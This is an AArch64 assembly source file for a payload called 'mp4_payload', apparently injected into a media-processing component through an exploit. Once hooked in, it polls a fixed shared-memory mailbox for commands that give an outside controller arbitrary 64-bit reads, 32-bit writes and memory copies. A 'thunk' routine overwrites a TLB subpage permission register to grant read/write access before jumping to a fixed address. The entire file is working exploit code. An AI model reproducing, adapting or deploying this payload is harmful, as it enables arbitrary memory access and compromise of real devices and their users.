// aarch64-linux-gnu-gcc -static -nostdlib -o mp4_payload.o mp4_payload.s && aarch64-linux-gnu-objcopy -O binary -j .text mp4_payload.o mp4_payload
.global _start
_start:
    sub sp, sp, #0x40
    stp x0, x1, [sp,#0]
    stp x2, x3, [sp,#16]
    stp x4, x5, [sp,#32]

next:
    movz x0, 0x7000
    movk x0, 0x0643, lsl 16

    dc civac, x0
    ldr x1, [x0]

    movz x2, 0xdead
    cmp x1, x2
    beq cmd3

    movz x1, 0x4141
    str x1, [x0]

loop:
    dc civac, x0

    ldr x1, [x0]
    cmp x1, #1
    beq cmd1
    cmp x1, #2
    beq cmd2
    cmp x1, #3
    beq cmd3
    cmp x1, #4
    beq cmd4

    b loop

cmd1: // read64
    ldr x1, [x0, #8]
    ldr x1, [x1]
    str x1, [x0, #8]
    b next

cmd4: // memcpy64
    ldr x1, [x0, #8]
    ldr x2, [x0, #16]
    ldr x3, [x0, #24]
cmd4_loop:
    ldr x4, [x1]
    str x4, [x2]

    add x1, x1, #8
    add x2, x2, #8
    subs x3, x3, #8
    bne cmd4_loop
    b next

cmd2: // write32
    ldr x1, [x0, #8]
    ldr x2, [x0, #16]
    str w2, [x1]
    b next

cmd3: // return
    movz x1, 0xdead
    str x1, [x0]
    dc civac, x0

    ldp x4, x5, [sp,#32]
    ldp x2, x3, [sp,#16]
    ldp x0, x1, [sp,#0]
    add sp, sp, #0x40

    mov x0, x19 // the hooked instruction
    ret

.global thunk
thunk:
    stp x29, x30, [sp, #-0x10]!
    // tlb34_subpage_rw = 0x03230000 + 0x3e0 + (34 - 1) * 4
    movz x29, #0x0464
    movk x29, #0x0323, lsl 16
    mov w30, #0xffffffff
    str w30, [x29]

    movz x29, #0x1000
    movk x29, #0x887f, lsl 16
    blr x29
    ldp x29, x30, [sp], #0x10
    ret
